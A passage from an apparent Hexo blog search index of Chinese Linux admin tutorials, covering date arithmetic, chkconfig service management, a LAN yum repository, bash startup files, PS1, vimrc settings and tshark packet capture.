    <content type="text"><![CDATA[Linux下比较两个时间的时间差&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有一个特殊的需求，知道两个文件的最后修改时间，现在要比较这两个时间的时间差是不是在一个阀值内？这就需要求出连个时间的时间差。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux下，有一个方法可以将基础时间转为时间戳 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，2017-07-13 10:01:05 这个时间的时间戳为 12[root@localhost ~]# date +%s -d '2017-07-13 10:01:05'1499911265 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据这个时间戳，就可以求出两个时间的时间差了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如，求2017-07-13 10:01:05 和 2017-07-13 11:01:05两个时间的时间差 12345[root@localhost ~]# a=`date +%s -d '2017-07-13 10:01:05'`[root@localhost ~]# b=`date +%s -d '2017-07-13 11:01:05'` [root@localhost ~]# time=$[$b-$a][root@localhost ~]# echo $time3600 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;结果就是3600，可见它的单位是秒，如果求分钟，直接除以60即可。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统服务]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F62.%20Linux%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Linux系统服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你对windows非常熟悉的话，相信你肯定配置过开机启动的服务，有些服务我们日常用不到则要把它停掉，一来可以节省资源，二来可以减少安全隐患。在linux上同样也有相关的工具来管理系统的服务。 1. ntsysv服务配置工具&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来配置哪些服务开启或者关闭，有点类似图形界面，不过是使用键盘来控制的。如果没有这个命令请使用 yum install -y ntsysv 安装它。安装好后，直接运行命令 ntsysv 回车后弹出一个配置界面： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按键盘的上下方向键可以调节红色光标，按空格可以选择开启或者不开启，如果前面的中括号内显示有 * 则表示开启否则不开启。通过这个工具也可以看到目前系统中所有的服务。 建议除 “crond, iptables, network, sshd, syslog, irqbalance, sendmail, microcode_ctl” 外其他服务全部停掉。选择好后，按 “tab” 键选择 “确定”, 然后回车，需要重启机器才能生效 。 2. chkconfig服务管理工具&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统所有的预设服务可以查看/etc/init.d/目录得到: 12345678[root@localhost ~]# ls /etc/init.dauditd keepalived netfs portreserve rpcidmapd squidcrond killall network postfix rpcsvcgssd sshdfunctions messagebus nfs rdisc rsyslog sysstathalt mysqld nfslock resin sandbox tomcatip6tables mysqldslave nmb restorecond saslauthd udev-postiptables named ntpd rpcbind single vsftpdipvsadm netconsole ntpdate rpcgssd smb winbind &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实这就是系统所有的预设服务了。为什么这样讲，因为系统预设服务都是可以通过这样的命令实现 service 服务名 start|stop|restart 这里的服务名就是/etc/init.d/目录下的这些文件了。除了可以使用 service crond start 启动crond外，还可以使用 /etc/init.d/crond start 来启动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;言归正传，我们可以使用 chkconfig –list 列出所有的服务以及每个级别是否开启: 123456789101112131415161718192021222324252627282930313233343536[root@localhost ~]# chkconfig --listabrt-ccpp 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:启用 6:关闭abrtd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:启用 6:关闭acpid 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭atd 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭auditd 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭blk-availability 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭cpuspeed 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭crond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭haldaemon 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭htcacheclean 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭httpd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭ip6tables 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭iptables 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭irqbalance 0:关闭 1:关闭 2:关闭 3:启用 4:启用 5:启用 6:关闭kdump 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭lvm2-monitor 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭mdmonitor 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭messagebus 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭netconsole 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭netfs 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭network 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭ntpd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭ntpdate 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭postfix 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭psacct 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭quota_nld 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭rdisc 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭restorecond 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭rngd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭rsyslog 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭saslauthd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭smartd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭sshd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭sysstat 0:关闭 1:启用 2:启用 3:启用 4:启用 5:启用 6:关闭udev-post 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的级别（0,1,2,3,4,5,6）就是 /etc/inittab 里面的那几个启动级别了，0、1、6运行级别被系统保留：其中0作为shutdown动作，1作为重启至单用户模式，6为重启；在一般的Linux系统实现中，都使用了2、3、4、5几个级别，在CentOS系统中，2表示无NFS支持的多用户模式，3表示完全多用户模式（也是最常用的级别），4保留给用户自定义，5表示图形登录方式。我们可以使用grep命令把我们想要看的服务过滤出来: 12[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在我们只是看到了各服务在每个级别下是否开启，那么如何去更改哪个级别下是否开启呢？ 123[root@localhost ~]# chkconfig --level 3 crond off[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 –level 指定级别，后面是服务名，然后是 off 或者 on ，–level 后还可以跟多个级别： 123[root@localhost ~]# chkconfig --level 345 crond off[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:关闭 4:关闭 5:关闭 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还可以省略级别，默认是针对2，3，4，5级别操作： 123[root@localhost ~]# chkconfig crond on[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chkconfig 还有一个功能就是可以把某个服务加入到系统服务，即可以使用 service 服务名 start 这样的形式，并且可以在 chkconfig --list 中查找到。当然也能删除掉。 12345[root@localhost ~]# chkconfig --del crond[root@localhost ~]# chkconfig --list |grep cron[root@localhost ~]# chkconfig --add crond[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个功能常用在把自定义的启动脚本加入到系统服务当中。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[yum局域网软件源搭建]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F39.yum%E5%B1%80%E5%9F%9F%E7%BD%91%E8%BD%AF%E4%BB%B6%E6%BA%90%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[yum局域网软件源搭建1.搭建apache服务器或ftp服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum安装或二进制安装 2、准备RPM包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把CentOS的DVD1和DVD2.iso都下载下来，把DVD1.iso里的所有内容解压出来，放到/var/www/html/centos-6目录下，然后把DVD2.iso解压出来的Packages目录下的rpm包复制到/var/html/centos-6/Packages目录下，这样/var/html/centos-6/Packages里面就有了6000多个rpm包。 3、创建yum仓库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;准备createrepo： 1yum -y install createrepo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建repository： 1createrepo /var/www/html/centos-6/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建完成之后，会在/var/www/html/centos-6/repodata下生成一些文件。 4、使用软件源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在其他centos机器上试试软件源能不能用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先修改机器上软件源配置文件： 12345678910111213141516171819# cd /etc/yum.repos.d/# mkdir bk# mv *.repo bk/# cp bk/CentOS-Base.repo ./# vi CentOS-Base.repoCentOS-Base.repo文件修改之后如下：[base]name=CentOS-$releasever - Basebaseurl=http://*.*.*.*/centos-6/gpgcheck=1(改成0下面那行就不用设置了)gpgkey=http:///*.*.*.*/centos-6/RPM-GPG-KEY-CentOS-6enabled=1#released updates#[updates]#name=CentOS-$releasever - Updates#baseurl=http:///*.*.*.*/centos-6/#gpgcheck=1#gpgkey=http:///*.*.*.*/centos-6/RPM-GPG-KEY-CentOS-6#enabled = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存之后，就可以使用局域网的软件源了： 1# yum update]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux支持中文]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F46.Linux%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%2F</url>
    <content type="text"><![CDATA[Linux支持中文 修改/root/.bash_profile文件，增加export LANG=zh_CN.GB18030对于其他用户，也必须相应修改该文件使用该方法时putty能显示中文，但桌面系统是英文，而且所有的网页中文显示还是乱码 引用:修改/etc/sysconfig/i18n文件 123#LANG="en_US.UTF-8"#SUPPORTED="en_US.UTF-8:en_US:en"#SYSFONT="latarcyrheb-sun16" 改为 12345LANG="zh_CN.GB18030"LANGUAGE="zh_CN.GB18030:zh_CN.GB2312:zh_CN"SUPPORTED="zh_CN.GB18030:zh_CN:zh"SYSFONT="lat0-sun16"SYSFONTACM="8859-15"]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统和用户的环境变量配置文件]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F42.Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%94%A8%E6%88%B7%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux系统和用户的环境变量配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux系统中，有很多系统的变量，这些变量被存在 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile: 这个文件预设了几个重要的变量，例如 PATH , USER , LOGNAME , MAIL , INPUTRC , HOSTNAME , HISTSIZE , umake等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/bashrc: 这个文件主要预设umake以及PS1。这个PS1就是我们在敲命令的时，前面那串字符了，例如CentOS root用户默认PS1就是[root@localhost~]#，PS1的值。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/u 就是用户，/h 主机名，/W 则是当前目录，/$ 就是那个‘#’了。如果普通用户显示为‘$’。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了两个系统级别的配置文件外，每个用户的主目录下还有几个这样的隐藏文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_proffile: 定义了用户的个人划路径与环境变量的文件名称。每个用户都可使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_history: 记录命令历史用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_logout: 当退出shell时，会执行该文件。可以把一些清理的工作放到这个文件中。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用tshark抓包分析http请求]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F47.%E4%BD%BF%E7%94%A8tshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90http%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[使用tshark抓包分析http请求&#160; &#160; &#160; &#160;默认我们的机器上是没有安装这个工具的。如果你的linux是CentOS那么就使用yum安装 1yum install -y wireshark &#160; &#160; &#160; &#160;也可以到官网下载源码具体安装方法，请参考以下，简单介绍这个抓包工具的应用 &#160; &#160; &#160; &#160;1. 以下的用法可以显示访问http请求的域名以及uri 1tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri" &#160; &#160; &#160; &#160;2. 以下可以抓取mysql的查询 1tshark -n -i eth1 -R 'mysql.query' -T fields -e "ip.src" -e "mysql.query" &#160; &#160; &#160; &#160;另外一种方法： 1tshark -i eth1 port 3307 -d tcp.port==3307,mysql -z "proto,colinfo,mysql.query,mysql.query" &#160; &#160; &#160; &#160; 3. 以下可以抓取指定类型的MySQL查询 1tshark -n -i eth1 -R 'mysql matches "SELECT|INSERT|DELETE|UPDATE"' -T fields -e "ip.src" -e "mysql.query" &#160; &#160; &#160; &#160;4. 统计http的状态 1tshark -n -q -z http,stat, -z http,tree &#160; &#160; &#160; &#160;这个命令，直到你ctrl + c 才会显示出结果 &#160; &#160; &#160; &#160;5. tshark 增加时间标签 12tshark -t adtshark -t a]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux环境变量之“PS1”]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F41.Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B9%8B%E2%80%9CPS1%E2%80%9D%2F</url>
    <content type="text"><![CDATA[Linux环境变量之“PS1”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS1（是数字1而不是字母l），每个版本bash的PS1变量内的特殊符号可能有些小的差异，你可以先man bash 一下。下面是FC4环境下默认的特殊符号所代表的意义： \d ：代表日期，格式为weekday month date，例如：”Mon Aug 1” \H ：完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux \h ：仅取主机的第一个名字，如上例，则为fc4，.linux则被省略 \t ：显示时间为24小时格式，如：HH：MM：SS \T ：显示时间为12小时格式 \A ：显示时间为24小时格式：HH：MM \u ：当前用户的账号名称 \v ：BASH的版本信息 \w ：完整的工作目录名称。家目录会以 ~代替 \W ：利用basename取得工作目录名称，所以只会列出最后一个目录 \# ：下达的第几个命令 \$ ：提示字符，如果是root时，提示符为：# ，普通用户则为：$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认的PS1内容为： ‘[\u@\h \W]\$ ‘ ，所以默认的提示符就是： 1[root@localhost ~]# 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但设置PS1的时候需要稍微处理一下 1PS1="[\\u@\\h \\W]\\$ " 这样显示的结果才是正确的]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim设置自动缩进]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F32.%20vim%E8%AE%BE%E7%BD%AE%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%8A%A8%E7%BC%A9%E8%BF%9B%2F</url>
    <content type="text"><![CDATA[vim设置自动缩进&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;centos系统，修改vim的配置文件 /etc/vimrc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下内容：1) 打开 vimrc ，添加以下语句来使得语法高亮显示：syntax on2) 如果此时语法还是没有高亮显示，那么在 /etc 目录下的 profile 文件中添加以下语句：export TERM=xterm-color3) 解决方向键和退格键失效的问题（采用非兼容模式）set nocompatibleset backspace=24) 设置 Windows 风格的 C/C++ 自动缩进（添加以下 set 语句到 vimrc 中） 设置（软）制表符宽度为 4 ：set tabstop=4set softtabstop=4 设置缩进的空格数为 4set shiftwidth=4 设置自动缩进 ：即每行的缩进值与上一行相等；使用 noautoindent 取消设置：set autoindent 设置 使用 C/C++ 语言的自动缩进方式：set cindent 设置 C/C++ 语言的具体缩进方式 ：set cinoptions={0,1s,t0,n-2,p2s,(03s,=.5s,&gt;1s,=1s,:1s 如果想在左侧显示文本的行号，可以用以下语句：set nu 最后，如果没有下列语句，就加上吧: 12345if &amp;term=="xterm"set t_Co=8 set t_Sb=^[[4%dmset t_Sf=^[[3%dmendif]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让命令历史永久保存并加时间戳]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F45.%E8%AE%A9%E5%91%BD%E4%BB%A4%E5%8E%86%E5%8F%B2%E6%B0%B8%E4%B9%85%E4%BF%9D%E5%AD%98%E5%B9%B6%E5%8A%A0%E6%97%B6%E9%97%B4%E6%88%B3%2F</url>
    <content type="text"><![CDATA[让命令历史永久保存并加时间戳12345678#!/bin/shgrep HISTTIMEFORMAT /etc/bashrc || echo 'export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "' &gt;&gt;/etc/bashrcfor U in `grep -v shutdown /etc/passwd|awk -F: '$NF~/sh/&amp;&amp;$NF!~/no/&#123;print $1&#125;'`do UHOME=`cat /etc/passwd|grep "^$U"|cut -d: -f6` [ ! -f $UHOME/.bash_history ] &amp;&amp; touch $UHOME/.bash_history chattr +a $UHOME/.bash_historydone]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统变量的作用]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F44.Linux%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%9C%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Linux系统变量的作用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile、/etc/bashrc、~/.bash_profile、~/.bashrc很容易混淆，他们之间有什么区别？它们的作用到底是什么？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile: 用来设置系统环境参数，比如$PATH. 这里面的环境变量是对系统内所有用户生效的。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/bashrc: 这个文件设置系统bash shell相关的东西，对系统内所有用户生效。只要用户运行bash命令，那么这里面的东西就在起作用。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bash_profile: 用来设置一些环境变量，功能和/etc/profile 类似，但是这个是针对用户来设定的，也就是说，你在/home/user1/.bash_profile 中设定了环境变量，那么这个环境变量只针对 user1 这个用户生效. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bashrc: 作用类似于/etc/bashrc, 只是针对用户自己而言，不对其他用户生效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外/etc/profile中设定的变量(全局)的可以作用于任何用户,而~/.bashrc等中设定的变量(局部)只能继承/etc/profile中的变量,他们是”父子”关系. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bash_profile 是交互式、login 方式进入 bash 运行的，意思是只有用户登录时才会生效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bashrc 是交互式 non-login 方式进入 bash 运行的，用户不一定登录，只要以该用户身份运行命令行就会读取该文件。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bash_profile和bashrc区别]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F43.bash_profile%E5%92%8Cbashrc%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[bash_profile和bashrc区别.bash_profile 与 .bashrc 的区别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_profile is executed for login shells, while .bashrc is executed for interactive non-login shells. login shell 与 non-login shell 的区别 当你直接在机器login界面登陆、使用ssh登陆或者su切换用户登陆时，.bash_profile 会被调用来初始化shell环境 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Note：.bash_profile文件默认调用.bashrc文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_profile中有如下内容 123if [ -f ~/.bashrc ]; then . ~/.bashrcfi 当你不登陆系统而使用ssh直接在远端执行命令，.bashrc 会被调用 当你已经登陆系统后，每打开一个新的Terminal时，.bashrc 都会被再次调用。 测试准备工作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;hclient2主机hadoop用户家目录下执行 12[hadoop@hclient2 ~]$ echo "invoke hclient2:~/.bashrc"&gt;&gt;.bashrc[hadoop@hclient2 ~]$ echo "invoke hclient2:~/.bash_profile"&gt;&gt;.bash_profile Login Shell 窗口登陆 1234567891011Red Hat Enterprise Linux Server release 6.3 (Santiago)Kernel 2.6.32-279.el6.x86_64 on an x86_64hclient2 login: hadoopPassword:Last login: Mon Feb 25 23:03:45 on tty1invoke hclient2:~/.bashrcinvoke hclient2:~/.bash_profile[hadoop@hclient2 ~]$ SSH 登陆 12345[hadoop@hserver ~]$ ssh hclient2Last login: Mon Feb 25 22:42:19 2013 from hserverinvoke hclient2:~/.bashrcinvoke hclient2:~/.bash_profile[hadoop@hclient2 ~]$ su 登陆 123[root@hclient2 ~]# su - hadoopinvoke hclient2:~/.bashrcinvoke hclient2:~/.bash_profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Non-login Shell: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Note: 1ssh ...[user@] hostname [command] 1234If command is specified, it is executed on the remote host instead of a login shell.[hadoop@hserver ~]$ ssh hclient2 hostnameinvoke hclient2:~/.bashrchclient2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：若要配置环境变量之类，最保险是写在 .bashrc 文件中。因为不管是登陆还是不登陆，该文件总会被调用！]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim的设置详解]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F31.%20vim%E7%9A%84%E8%AE%BE%E7%BD%AE%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[vim的设置详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vim通过一个叫vimrc的文件来进行设置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vimrc 配置文件存放位置： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统vimrc在 /etc/vimrc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户的在 $HOME/.vimrc 这个默认不存在，需用户自定义创建。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面介绍vimrc中常用的配置选项，其中以”为开头的行为不生效的行，也就是说在vimrc配置文件中，它是以”为注释符号的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186set nobackup" 不要生成swap文件，当buffer被丢弃的时候隐藏它setlocal noswapfileset bufhidden=hide" 字符间插入的像素行数目set linespace=0" 增强模式中的命令行自动完成操作set wildmenu" 在状态行上显示光标所在位置的行号和列号set rulerset rulerformat=%20(%2*%&lt;%f%=\ %m%r\ %3l\ %c\ %p%%%)" 命令行（在状态行下）的高度，默认为1，这里是2set cmdheight=2" 使回格键（backspace）正常处理indent, eol, start等set backspace=2" 允许backspace和光标键跨越行边界set whichwrap+=&lt;,&gt;,h,l" 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）set mouse=aset selection=exclusiveset selectmode=mouse,key" 启动的时候不显示那个援助索马里儿童的提示set shortmess=atI" 通过使用: commands命令，告诉我们文件的哪一行被改变过set report=0" 不让vim发出讨厌的滴滴声set noerrorbells" 在被分割的窗口间显示空白，便于阅读set fillchars=vert:\ ,stl:\ ,stlnc:\"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 搜索和匹配"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 高亮显示匹配的括号set showmatch" 匹配括号高亮的时间（单位是十分之一秒）set matchtime=5" 在搜索的时候忽略大小写set ignorecase" 不要高亮被搜索的句子（phrases）set nohlsearch" 在搜索时，输入的词句的逐字符高亮（类似firefox的搜索）set incsearch" 输入:set list命令是应该显示些啥？set listchars=tab:\|\ ,trail:.,extends:&gt;,precedes:&lt;,eol:$" 光标移动到buffer的顶部和底部时保持3行距离set scrolloff=3" 不要闪烁set novisualbell" 我的状态行显示的内容（包括文件类型和解码）set statusline=%F%m%r%h%w\[POS=%l,%v][%p%%]\%&#123;strftime(\"%d/%m/%y\ -\ %H:%M\")&#125;" 总是显示状态行set laststatus=2"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 文本格式和排版"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 自动格式化set formatoptions=tcrqn" 继承前一行的缩进方式，特别适用于多行注释set autoindent" 为C程序提供自动缩进set smartindent" 使用C样式的缩进set cindent" 制表符为4set tabstop=4" 统一缩进为4set softtabstop=4set shiftwidth=4" 不要用空格代替制表符set noexpandtab" 不要换行set nowrap" 在行和段开始处使用制表符set smarttab"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" CTags的设定"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 按照名称排序let Tlist_Sort_Type = "name"" 在右侧显示窗口let Tlist_Use_Right_Window = 1" 压缩方式let Tlist_Compart_Format = 1" 如果只有一个buffer，kill窗口也kill掉bufferlet Tlist_Exist_OnlyWindow = 1" 不要关闭其他文件的tagslet Tlist_File_Fold_Auto_Close = 0" 不要显示折叠树let Tlist_Enable_Fold_Column = 0"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" Autocommands"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 只在下列文件类型被侦测到的时候显示行号，普通文本文件不显示if has("autocmd")autocmd FileType xml,html,c,cs,java,perl,shell,bash,cpp,python,vim,php,ruby set numberautocmd FileType xml,html vmap 'o'&gt;o--&gt;autocmd FileType java,c,cpp,cs vmap ' 0 &amp;&amp; line("'\"") &lt;= line("$") |\ exe " normal g`\"" |\ endifendif "has("autocmd")" F5编译和运行C程序，F6编译和运行C++程序" 请注意，下述代码在windows下使用会报错" 需要去掉./这两个字符" C的编译和运行map :call CompileRunGcc()func! CompileRunGcc()exec "w"exec "!gcc % -o %&lt;"exec "! ./%&lt;"endfunc" C++的编译和运行map :call CompileRunGpp()func! CompileRunGpp()exec "w"exec "!g++ % -o %&lt;"exec "! ./%&lt;"endfunc" 能够漂亮地显示.NFO文件set encoding=utf-8function! SetFileEncodings(encodings)let b:myfileencodingsbak=&amp;fileencodingslet &amp;fileencodings=a:encodingsendfunctionfunction! RestoreFileEncodings()let &amp;fileencodings=b:myfileencodingsbakunlet b:myfileencodingsbakendfunctionau BufReadPre *.nfo call SetFileEncodings('cp437')|set ambiwidth=single au BufReadPost *.nfo call RestoreFileEncodings()" 高亮显示普通txt文件（需要txt.vim脚本）au BufRead,BufNewFile * setfiletype txt" 用空格键来开关折叠set foldenableset foldmethod=manualnnoremap @=((foldclosed(line('.')) &lt; 0) ? 'zc':'zo')" minibufexpl插件的一般设置let g:miniBufExplMapWindowNavVim = 1let g:miniBufExplMapWindowNavArrows = 1let g:miniBufExplMapCTabSwitchBufs = 1let g:miniBufExplModSelTarget = 1]]></content>
      <tags>
